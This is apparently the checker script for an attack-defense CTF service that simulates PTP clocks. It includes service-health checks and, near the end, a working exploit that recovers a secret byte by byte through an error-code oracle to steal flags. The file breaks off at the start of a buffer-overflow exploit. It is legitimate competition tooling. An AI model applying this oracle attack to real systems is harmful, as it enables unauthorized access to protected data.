import asyncio
import httpx
import typing
import contextlib
import random
import string
import secrets
import hmac
import hashlib
import struct
import json
import errno
import fake_useragent
import lorem
import time
import base64
import binascii
import numpy as np

from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import assert_equals, FlagSearcher

import ptp_protocol
import ptp_message
import bf


"""
Checker config
"""

LOCAL_PORT = 2000
EVENT_PORT = 319
GENERAL_PORT = 320
HTTP_PORT = 1588
checker = Enochecker("syncryn1z3", HTTP_PORT)
app = lambda: checker.app


"""
Flag functions
"""

def encode_flag(flag: str, logger: LoggerAdapter):
    try:
        # Extra logic to compress brainfuck flags
        if bf.is_bf(flag):
            return b"zlib" + bf.encode(flag)
        else:
            return flag.encode("utf-8")
    except Exception as e:
        logger.debug(f"Failed to encode flag: {flag} (Exception: {e})")
        return InternalErrorException("Failed to encode flag")
    
def decode_flag(flag: bytes, logger: LoggerAdapter, reencode=False):
    try:
        if flag.startswith(b"zlib"):
            return bf.decode(flag[4:], reencode)
        else:
            return flag.decode()
    except Exception as e:
        logger.debug(f"Failed to decode flag: {flag} (Exception: {e})")
        return MumbleException("Failed to decode flag")

"""
Utility functions
"""

def get_time_ns():
    return time.clock_gettime_ns(time.CLOCK_MONOTONIC)

def generate_port_id(cache_range: range = range(0, 256)):
    cache_index = random.randint(cache_range.start, cache_range.stop - 1)

    port = random.randint(0x1, 0xfffe)
    clock_id = (random.randint(0x200, 0x7ffffffffffff0) * 256) + cache_index - port
    
    return clock_id, port

def generate_secret(length: int):
    return (''.join(secrets.choice(string.digits) for _ in range(length)))

def generate_timestamp():
    return random.randint(0x0, 0x7fffffffffffffff)

def encode_port_id(clock_id: int, port: int):
    return f"{clock_id:x}/{port:x}"

def decode_port_id(port_id: str):
    parts = port_id.split("/")
    
    return int(parts[0], 16), int(parts[1], 16)

def policy_to_int(policy: str):
    if policy == "hmac":
        return ptp_protocol.lib.PTP_AUTHENTICATION_POLICY_HMAC_128
    elif policy == "plain":
        return ptp_protocol.lib.PTP_AUTHENTICATION_POLICY_PLAIN
    else:
        raise InternalErrorException(f"Unknown policy {policy}")


"""
Dependencies
"""

class UdpClientProtocol(asyncio.DatagramProtocol):
    def __init__(self):
        self.transport = None
        self.queue = asyncio.Queue()

        self.on_con_lost = asyncio.get_event_loop().create_future()

    def connection_made(self, transport):
        self.transport = transport

    def connection_lost(self, exc):
        if not self.on_con_lost.done():
            self.on_con_lost.set_result(True)

    def datagram_received(self, data, address):
        self.queue.put_nowait((data, address))

    def error_received(self, e):
        error = abs(e.errno)

        if error == errno.ENOENT or error == errno.ECONNRESET or error == errno.EHOSTUNREACH or error == errno.ENETUNREACH:
            raise OfflineException(f"UDP transport error: {e}")
        else:
            raise InternalErrorException(f"UDP transport error: {e}")

class UdpConnection:
    BUFFER_SIZE = 1472

    def __init__(self, remote_address, protocol: UdpClientProtocol, logger: LoggerAdapter):
        self.remote_address = remote_address
        self.protocol = protocol
        self.logger = logger

    def send_raw(self, request, port):
        self.protocol.transport.sendto(request, (self.remote_address, port))

        self.logger.debug(f"Sent message to {(self.remote_address, port)}")
        
    async def receive_raw(self, port):
        try:
            response, address = await asyncio.wait_for(self.protocol.queue.get(), 4.0)
        except asyncio.TimeoutError:
            raise OfflineException("Timeout waiting for UDP response")
        
        self.logger.debug(f"Received message from {address}")
        
        if (len(response) + 42) % 16 != 0:
            self.logger.debug(f"Received message length: {len(response)}")
            raise MumbleException("Invalid message length of response")

        return response

    def send(self, message, port):
        request, _ = message.encode(self.BUFFER_SIZE)
        self.send_raw(request, port)

    async def receive(self, port):
        response = await self.receive_raw(port)
        message, _ = ptp_message.from_buffer(response)

        self.logger.debug(f"Decoded received message (type: {message.decoded.type}, seqno: {message.decoded.sequence_id}, port_id: {encode_port_id(message.decoded.port_id.clock_id, message.decoded.port_id.port)}, flags: {message.decoded.flags:x}, tlvs: {len(message.get_tlvs())})")

        if message.decoded.type == ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
            self.logger.debug(f"Decoded management message: (action: {message.decoded.payload.management.action}, target_port_id: {encode_port_id(message.decoded.payload.management.target_port_id.clock_id, message.decoded.payload.management.target_port_id.port)})")

        return message

    async def transaction(self, request_message, port, responses=1, retries=2, send_raw=False, receive_raw=False):
        for i in range(retries):
            if send_raw:
                self.send_raw(request_message, port)
            else:
                self.send(request_message, port)

            response_messages = []

            try:
                for _ in range(responses):
                    if receive_raw:
                        response_messages += [await self.receive_raw(port)]
                    else:
                        response_messages += [await self.receive(port)]
                return response_messages
            except OfflineException as e:
                # Try again, under high load UDP packets are sometimes lost
                self.logger.debug("Transaction retry")
                if i == retries - 1:
                    raise e

@checker.register_dependency
@contextlib.asynccontextmanager
async def _get_async_udp_protocol(logger: LoggerAdapter) -> typing.AsyncIterator[UdpClientProtocol]:
    try:
        transport, protocol = await asyncio.get_running_loop().create_datagram_endpoint(lambda: UdpClientProtocol(), local_addr=("0.0.0.0", 0))
    except Exception as e:
        logger.error(f"Failed to create UDP endpoint {e}")
        raise InternalErrorException("Could not create UDP socket")

    try:
        yield protocol
    finally:
        transport.close()
        await protocol.on_con_lost

@checker.register_dependency
def _get_udp_connection(task: BaseCheckerTaskMessage, protocol: typing.AsyncIterator[UdpClientProtocol], logger: LoggerAdapter) -> UdpConnection:
    return UdpConnection(task.address, protocol, logger)

class HttpConnection:
    def __init__(self, remote_address, client: httpx.AsyncClient, logger: LoggerAdapter):
        self.remote_address = remote_address
        self.client = client
        self.logger = logger

    async def post(self, request):
        self.logger.debug(f"Sent POST to {(self.remote_address)}: {request}")

        try:
            response = await self.client.post("/api", content=request, headers={"User-Agent": fake_useragent.UserAgent().random})
            response.raise_for_status()

            return response.text
        except httpx.ConnectError:
            raise OfflineException(f"HTTP connect error")
        except httpx.ConnectTimeout as e:
            raise OfflineException(f"HTTP connect timeout")
        except httpx.TimeoutException as e:
            raise OfflineException(f"HTTP timeout")
        except httpx.NetworkError as e:
            raise OfflineException(f"HTTP network error")
        except httpx.TransportError as e:
            raise MumbleException(f"HTTP transport error")
        except httpx.HTTPError as e:
            raise MumbleException(f"HTTP error")

@checker.register_dependency
def _get_http_connection(task: BaseCheckerTaskMessage, client: httpx.AsyncClient, logger: LoggerAdapter) -> HttpConnection:
    return HttpConnection(task.address, client, logger)

"""
Message functions
"""

def add_auth_tlv(message, policy: str, icv_length=None):
    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION)
    tlv.payload.authentication.policy = policy_to_int(policy)
    tlv.payload.authentication.parameter_indicator = 0
    tlv.payload.authentication.key_id = 0

    if icv_length is not None:
        tlv.payload.authentication.icv_length = icv_length
    elif policy == "hmac":
        tlv.payload.authentication.icv_length = 16
    elif policy == "plain":
        tlv.payload.authentication.icv_length = 64
    else:
        raise InternalErrorException(f"Unknown policy {policy}")
    
def finalize_auth_tlv(tlv, request_pointer, secret=b"", icv=None):
    if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
        return
    
    buffer_address = ptp_protocol.ffi.cast("uint8_t *", request_pointer)
    icv_address = ptp_protocol.ffi.cast("uint8_t *", tlv.payload.authentication.icv)

    icv_offset = icv_address - buffer_address
    
    if tlv.payload.authentication.policy == policy_to_int("hmac"):
        if icv is None:
            icv = hmac.new(secret, pointer_to_bytes(buffer_address, icv_offset), hashlib.sha256).digest()
    elif tlv.payload.authentication.policy == policy_to_int("plain"):
        icv = secret + b'\0' * (tlv.payload.authentication.icv_length - len(secret))
    else:
        raise InternalErrorException(f"Unknown policy in finalize")

    ptp_protocol.ffi.memmove(icv_address, icv[:tlv.payload.authentication.icv_length], tlv.payload.authentication.icv_length)

def finalize_auth_tlvs(request_pointer, length, secret=b"", icv=None):
    message = ptp_message.from_pointer(request_pointer, length)

    for tlv in message.get_tlvs():
        finalize_auth_tlv(tlv, request_pointer, secret, icv)

def check_auth_tlv_hmac(tlv, response_pointer, secret):
    if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
        return False
    
    if tlv.payload.authentication.policy != policy_to_int("hmac"):
        raise MumbleException("Invalid policy in authentication TLV")
    
    if tlv.payload.authentication.icv_length != 16:
        raise MumbleException("Invalid ICV length in authentication TLV")

    buffer_address = ptp_protocol.ffi.cast("uint8_t *", response_pointer)
    icv_address = ptp_protocol.ffi.cast("uint8_t *", tlv.payload.authentication.icv)

    icv_offset = icv_address - buffer_address
    icv = hmac.new(secret, pointer_to_bytes(response_pointer, icv_offset), hashlib.sha256).digest()

    supplied_icv = pointer_to_bytes(tlv.payload.authentication.icv, 16)

    if supplied_icv != icv[:16]:
        raise MumbleException("Invalid ICV in authentication TLV")
    
    return True

def check_auth_tlvs_hmac(response, secret):
    message, response_pointer = ptp_message.from_buffer(response)

    for tlv in message.get_tlvs():
        if check_auth_tlv_hmac(tlv, response_pointer, secret):
            return
        
    raise MumbleException("No authentication TLV in response") 

def pointer_to_bytes(pointer, length):
    return ptp_protocol.ffi.buffer(pointer, length)[:]

"""
Functionality functions
"""

async def create_clock(connection: HttpConnection, logger: LoggerAdapter, clock_id: int, port: int, offset: int, visible: bool, secret: str, policy: str, description: bytes, expect_error=False):
    request = json.dumps({
        "task": "create_clock",
        "clockId": f"{clock_id:x}",
        "port": f"{port:x}",
        "offset": offset,
        "visible": visible,
        "authenticationPolicy": policy,
        "userDescription": base64.b64encode(description).decode(),
        "secret": secret})
    
    response = await connection.post(request)

    try:
        response_decoded = json.loads(response)
    except json.JSONDecodeError:
        raise MumbleException("Failed to decode JSON reponse")

    if expect_error:
        try:
            return response_decoded["error"], response_decoded["code"]
        except KeyError:
            raise MumbleException("Expected 'error' and 'code' key in JSON response")
    else:
        try:
            error = response_decoded["error"]
            code = response_decoded["code"]
            logger.info(f"Received unexpected 'error' key in JSON response: {error} ({code})")
            raise MumbleException(f"Received unexpected 'error' key in JSON response)")
        except KeyError:
            pass

        try:
            assert_equals(response_decoded["task"], "create_clock", "Task mismatch in response")
        except KeyError:
            raise MumbleException("Expected 'task' key in JSON response")

async def inspect_clock(connection: HttpConnection, logger: LoggerAdapter, clock_id: int, port: int, secret: str, expect_error=False):
    request = json.dumps({
        "task": "inspect_clock",
        "clockId": f"{clock_id:x}",
        "port": f"{port:x}",
        "secret": secret})
    
    response = await connection.post(request)

    try:
        response_decoded = json.loads(response)
    except json.JSONDecodeError:
        raise MumbleException("Failed to decode JSON reponse")

    if expect_error:
        try:
            return response_decoded["error"], response_decoded["code"]
        except KeyError:
            raise MumbleException("Expected 'error' and 'code' key in JSON response")
    else:
        try:
            error = response_decoded["error"]
            code = response_decoded["code"]
            logger.info(f"Received unexpected 'error' key in JSON response: {error} ({code})")
            raise MumbleException(f"Received unexpected 'error' key in JSON response")
        except KeyError:
            pass

        try:
            assert_equals(response_decoded["task"], "inspect_clock", "Task mismatch in response")
        except KeyError:
            raise MumbleException("Expected 'task' key in JSON response")
        
    try:
        user_description = response_decoded["userDescription"]
    except KeyError:
        raise MumbleException("Expected 'userDescription' key in JSON response")
        
    try:
        decoded_user_description = base64.b64decode(user_description, validate=True)
    except binascii.Error:
        raise MumbleException("Failed to decode base64 encoded user description")
    
    logger.debug(f"Decoded user description: {decoded_user_description}")
    return decoded_user_description

async def get_user_description(connection: UdpConnection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, policy: str, expect_error=False):
    logger.debug(f"Get user description (port_id: {encode_port_id(clock_id, port)}, secret: {secret}, policy: {policy})")

    local_clock_id, local_port = generate_port_id()
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(message, policy)
    request, request_pointer = message.encode(connection.BUFFER_SIZE)
    finalize_auth_tlvs(request_pointer, len(request), secret=secret)
    request = pointer_to_bytes(request_pointer, len(request))

    [response] = await connection.transaction(request, GENERAL_PORT, send_raw=True)

    received_description = None

    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_description = pointer_to_bytes(tlv.payload.management.payload.user_description.data, tlv.payload.management.payload.user_description.length)
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            if expect_error:
                return ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()
            else:
                logger.info(f"Unexpected management error (get user description): {ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()}")
                raise MumbleException("Unexpected management error in USER_DESCRIPTION response")
            
    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE and not expect_error:
        raise MumbleException("Expected management response action")

    if expect_error:
        raise MumbleException("Expected management error in USER_DESCRIPTION response")
        
    return received_description
    
async def get_time(connection: UdpConnection, logger: LoggerAdapter, clock_id: int, port: int, expect_error=False):
    logger.debug(f"Get time (port_id: {encode_port_id(clock_id, port)})")

    local_clock_id, local_port = generate_port_id()
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME

    [response] = await connection.transaction(message, GENERAL_PORT)

    current_time = None

    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME:
                current_time = tlv.payload.management.payload.time
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            if expect_error:
                return ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()
            else:
                logger.info(f"Unexpected management error (get time): {ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()}")
                raise MumbleException("Unexpected management error in TIME response")
            
    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE and not expect_error:
        raise MumbleException("Expected management response action")

    if current_time is None:
        raise MumbleException("Received no TIME TLV")

    if expect_error:
        raise MumbleException("Expected management error in USER_DESCRIPTION response")
    
    return current_time

async def request_unicast_message(connection: UdpConnection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, policy: str, type: int):
    logger.debug(f"Request unicast message (port_id: {encode_port_id(clock_id, port)}, secret: {secret}, policy: {policy})")

    local_clock_id, local_port = generate_port_id()
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_SIGNALING, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.signaling.target_port_id.clock_id = clock_id
    payload.signaling.target_port_id.port = port

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_REQUEST_UNICAST_TRANSMISSION)
    tlv.payload.request_unicast.type = type
    tlv.payload.request_unicast.log_message_interval = 0
    tlv.payload.request_unicast.duration = 0

    add_auth_tlv(message, policy)
    request, request_pointer = message.encode(connection.BUFFER_SIZE)
    finalize_auth_tlvs(request_pointer, len(request), secret=secret)
    request = pointer_to_bytes(request_pointer, len(request))

    [signaling_response, actual_response] = await connection.transaction(request, EVENT_PORT, responses=2, send_raw=True)

    # Packets may arrive out of order
    if signaling_response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_SIGNALING:
        logger.debug("Packets arrived out of order")
        signaling_response, actual_response = actual_response, signaling_response

    for tlv in signaling_response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_GRANT_UNICAST_TRANSMISSION:
            return actual_response
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            raise MumbleException(f"Received error from server: {ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()}")

    raise MumbleException("Received no unicast transmission grant")

async def run_synchronization(connection: UdpConnection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, policy: str):
    logger.debug(f"Run synchronization (port_id: {encode_port_id(clock_id, port)}, secret: {secret}, policy: {policy})")

    sync = await request_unicast_message(connection, logger, clock_id, port, secret, policy, ptp_protocol.lib.PTP_MESSAGE_TYPE_SYNC)

    if sync.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_SYNC:
        raise MumbleException("Expected sync message")
    
    t1 = sync.decoded.payload.event.timestamp

    local_clock_id, local_port = generate_port_id()
    delay_request = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_DELAY_REQUEST, local_clock_id, local_port, 0)

    payload = delay_request.get_payload()
    payload.event.timestamp = get_time_ns()

    [delay_response] = await connection.transaction(delay_request, EVENT_PORT)

    if delay_response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_DELAY_RESPONSE:
        raise MumbleException("Expected delay response message")
    
    t4 = delay_response.decoded.payload.event.timestamp

    if (t1 >= t4):
        raise MumbleException("Timejump during synchronization process")


"""
Checker functions
"""

@checker.putflag(0)
async def putflag_visible(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    connection: HttpConnection,
    logger: LoggerAdapter,
) -> None:
    clock_id, port = generate_port_id(range(2, 256)) # We require at least one cache entry in front for buffer overflow
    secret = generate_secret(16)

    # Generate random text in the beginning, so that the flag cannot be read by PTP messages
    prefix = ""
    while len(prefix) < 128:
        prefix += lorem.get_sentence(1)
    
    prefix += " "
    description = prefix + task.flag
    description = description.encode("utf-8")

    if len(description) > 1500:
        raise InternalErrorException("Encountered flag with unsupported length")

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "hmac", description)

    await db.set("userdata", (clock_id, port, secret))
    await db.set("prefix_length", len(prefix))

    return encode_port_id(clock_id, port)

@checker.putflag(1)
async def putflag_hmac(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    connection: HttpConnection,
    logger: LoggerAdapter,    
) -> None:
    description = encode_flag(task.flag, logger)
    clock_id, port = generate_port_id(range(0, 1)) # Dont be vulnerable to buffer overflow
    secret = generate_secret(random.randint(32, 63))

    if len(description) > 128:
        raise InternalErrorException("Encountered flag with unsupported length")

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), False, secret, "hmac", description)

    await db.set("userdata", (clock_id, port, secret))

    return encode_port_id(clock_id, port)

@checker.putflag(2)
async def putflag_plain(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    connection: HttpConnection,
    logger: LoggerAdapter,    
) -> None:
    description = encode_flag(task.flag, logger)
    clock_id, port = generate_port_id(range(0, 1)) # Dont be vulnerable to buffer overflow
    secret = generate_secret(16)

    if len(description) > 128:
        raise InternalErrorException("Encountered flag with unsupported length")

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), False, secret, "plain", description)

    await db.set("userdata", (clock_id, port, secret))

    return encode_port_id(clock_id, port)

@checker.getflag(0)
async def getflag_visible(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    connection: HttpConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
        prefix_length = await db.get("prefix_length")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    received_description = await inspect_clock(connection, logger, clock_id, port, secret)
    received_flag = received_description[prefix_length:].decode()

    if received_flag != task.flag:
        raise MumbleException("Received wrong flag")

@checker.getflag(1)
async def getflag_hmac(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    received_description = await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "hmac")
    if received_description is None:
        raise MumbleException("Received no USER_DESCRIPTION TLV")
    
    if received_description != encode_flag(task.flag, logger):
        raise MumbleException("Received wrong flag")

@checker.getflag(2)
async def getflag_plain(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    received_description = await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "plain")
    if received_description is None:
        raise MumbleException("Received no USER_DESCRIPTION TLV")
    
    if received_description != encode_flag(task.flag, logger):
        raise MumbleException("Received wrong flag")
    
@checker.putnoise(0)
async def putnoise_time(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: HttpConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(random.randint(32, 63))
    start_time = generate_timestamp()

    await create_clock(connection, logger, clock_id, port, start_time, True, secret, "hmac", b"")

    await db.set("userdata", (clock_id, port, secret))
    await db.set("timedata", (start_time, get_time_ns()))

"""
@checker.putnoise(2)
async def putnoise_user_description_twice(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: HttpConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(random.randint(32, 63))
    description = generate_secret(random.randint(32, 63))

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "hmac", description.encode("utf-8"))
    error, _ = await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "hmac", generate_secret(random.randint(32, 63)).encode("utf-8"), True)

    assert_equals(error, "Failed to create clock in database", "Wrong error message")

    await db.set("userdata", (clock_id, port, secret, description))
"""
    
@checker.putnoise(1)
async def putnoise_none(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: HttpConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(random.randint(32, 63))
    description = generate_secret(random.randint(32, 63))

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "none", description.encode("utf-8"))

    await db.set("userdata", (clock_id, port, secret, description))

@checker.putnoise(2)
async def putnoise_hmac(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: HttpConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(random.randint(32, 63))

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "hmac", b"")

    await db.set("userdata", (clock_id, port, secret))

@checker.getnoise(0)
async def getnoise_time(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
        start_time, creation_time = await db.get("timedata")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    
    last_time = start_time + get_time_ns() - creation_time

    for _ in range(3):
        current_time = await get_time(connection, logger, clock_id, port)

        if current_time <= last_time:
            raise MumbleException("Timejump detected")
        
        last_time = current_time

    await run_synchronization(connection, logger, clock_id, port, secret.encode("ascii"), "hmac")

"""
@checker.getnoise(2)
async def getnoise_user_description_twice(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret, description = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")

    received_description = await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "hmac")
    assert_equals(received_description.decode(), description, "Received wrong description")
"""
    
@checker.getnoise(1)
async def getnoise_none(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: HttpConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret, description = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")

    received_description = await inspect_clock(connection, logger, clock_id, port, "")
    assert_equals(received_description.decode(), description, "Received wrong description")

@checker.getnoise(2)
async def getnoise_hmac(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    try:
        clock_id, port, secret = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    
    local_clock_id, local_port = generate_port_id()
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    [response] = await connection.transaction(message, GENERAL_PORT, receive_raw=True)

    check_auth_tlvs_hmac(response, secret.encode("ascii"))

@checker.havoc(0)
async def havoc_malformed_port_id(
    task: HavocCheckerTaskMessage,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id = 0xffffffffffffffff
    port = 0xffff
    secret = generate_secret(random.randint(32, 63))

    await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "hmac", True)

"""
@checker.havoc(1)
async def havoc_long_description(
    task: HavocCheckerTaskMessage,
    connection: HttpConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(random.randint(32, 63))

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "hmac", generate_secret(1500).encode("ascii"), False)
"""
     
@checker.havoc(1)
async def havoc_many_tlvs(
    task: HavocCheckerTaskMessage,
    connection: UdpConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    local_clock_id, local_port = generate_port_id()
    
    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET

    for _ in range(random.randint(16, 19)):
        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_PAD)
        tlv.payload.pad.length = random.randint(4, 8) * 2

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME

    [response] = await connection.transaction(message, GENERAL_PORT)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")

    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT or tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
            return
            
    raise MumbleException("Expected management TLV in response")

"""
@checker.havoc(3)
async def havoc_long_json(
    task: HavocCheckerTaskMessage,
    connection: HttpConnection,
    logger: LoggerAdapter,    
) -> None:
    response = await connection.post("{\"\":" * 1024)

    try:
        response_decoded = json.loads(response)
    except json.JSONDecodeError:
        raise MumbleException("Failed to decode JSON reponse")

    try:
        response_decoded["error"], response_decoded["code"]
    except KeyError:
        raise MumbleException("Expected 'error' and 'code' key in JSON response")
"""
         
@checker.havoc(2)
async def havoc_float_offset(
    task: HavocCheckerTaskMessage,
    connection: HttpConnection,
    logger: LoggerAdapter,    
) -> None:
    clock_id, port = generate_port_id()
    secret = generate_secret(random.randint(32, 63))
    description = generate_secret(random.randint(32, 63))

    # Make it harder to replace custom JSON lib
    await create_clock(connection, logger, clock_id, port, random.randint(0, 10000000000000) + random.uniform(0.01, 0.99), True, secret, "hmac", description.encode("utf-8"), True)

@checker.exploit(0)
async def exploit_memcmp(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    connection: HttpConnection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    clock_id, port = decode_port_id(task.attack_info)
    
    secret = ""

    for i in range(16):
        async def guess_byte(secret):
            request = json.dumps({
                "task": "inspect_clock",
                "clockId": f"{clock_id:x}",
                "port": f"{port:x}",
                "secret": secret})
    
            response = await connection.post(request)
            response_decoded = json.loads(response)

            if "userDescription" in response_decoded:
                # Early return in case we guessed the ICV prematurely
                logger.info("Early return")
                return 0

            return response_decoded["code"]

        secret += chr(await guess_byte(secret))

    received_description = await inspect_clock(connection, logger, clock_id, port, secret)
    received_flag = searcher.search_flag(received_description)
    
    logger.info(f"Received flag {received_flag}")
    return received_flag

@checker.exploit(1)
async def exploit_buffer_overflow(
